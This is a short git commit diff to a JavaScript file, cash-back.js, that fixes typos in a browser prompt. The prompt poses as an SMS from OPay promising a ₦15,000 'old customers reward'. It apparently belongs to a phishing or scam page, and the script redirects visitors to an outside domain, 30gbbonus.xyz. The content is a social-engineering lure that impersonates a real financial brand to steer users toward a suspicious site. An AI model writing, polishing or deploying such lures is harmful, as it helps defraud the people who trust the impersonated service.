f9fdce7b5417bb9bf11a1b3ca1100775fff117c5
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-09-13 01:42:24 -0700

    Update cash-back.js

--- cash-back.js
+++ cash-back.js
@@ -1,6 +1,6 @@
 
 var password = '₦15,000 Cash Back'
-password=prompt('SMS: Dear OPay customer, kindly check if your OPay Account is qualify to receive ₦₦15,000 Cash Back5,000 Cash Back, old customers Reward, press OK to check now ','₦15,000 Cash Back');
+password=prompt('SMS: Dear OPay customer, kindly check if your OPay Account is qualify to receive ₦15,000 Cash Back, OLD CUSTOMERS REWARD, press OK to check now ','₦15,000 Cash Back');
 if (password != '₦15,000 Cash Back') {
 location.href='https://30gbbonus.xyz/cash-15k.html';
 }
